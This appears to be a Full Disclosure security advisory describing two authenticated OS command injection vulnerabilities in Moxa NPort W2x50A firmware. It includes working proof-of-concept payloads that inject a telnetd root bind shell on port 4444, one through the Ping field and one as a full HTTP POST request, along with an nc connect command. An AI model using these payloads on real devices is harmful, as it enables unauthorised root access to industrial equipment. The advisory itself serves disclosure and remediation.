Subject: [FD] Multiple OS Command Injection in Moxa NPort W2x50A products


Moxa NPort W2x50A products with firmware version 2.1 Build_17112017 or lower are vulnerable to several authenticated OS Command Injection vulnerabilities:

#1 Authenticated OS Command Injection in web server ping functionality

Reserverd CVE ID: CVE-2018-19659

A specially crafted HTTP POST request to /goform/net_WebPingGetValue can result in running OS commands as the root user. Exploitation required authentication. This is similar to CVE-2017-12120.

Proof-of-concept: 
1. Authenticate to Moxa NPort W2x50A device.
2. Go to Main menu → System Management → Maintenance → Ping → Destination
3. Enter  ;telnetd -l/bin/sh -p4444&;. in 'Destination' field
4. Connect to opened bind shell: nc $IP_ADDRESS 4444

 #2 Authenticated OS Command Injection in web server wlan profile properties functionality

Reserverd CVE ID: CVE-2018-19660
 
A specially crafted HTTP POST request to /goform/net_WebSettingProfileSecurity can result in running OS commands as the root user. Exploitation required authentication. 

Proof-of-concept (sample HTTP request opening bind shell on port 4444):

POST /goform/webSettingProfileSecurity?profileID=1 HTTP/1.1
Host: {IP:PORT}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: SessionID={YOURSESSIONID}

Content-Type: application/x-www-form-urlencoded
Content-Length: 309
 
Authentication=3&EAP_method=1&Username= ;telnetd -l/bin/sh -p4444&;

These vulnerabilities were fixed in the firmware version 2.2 Build_18082311.
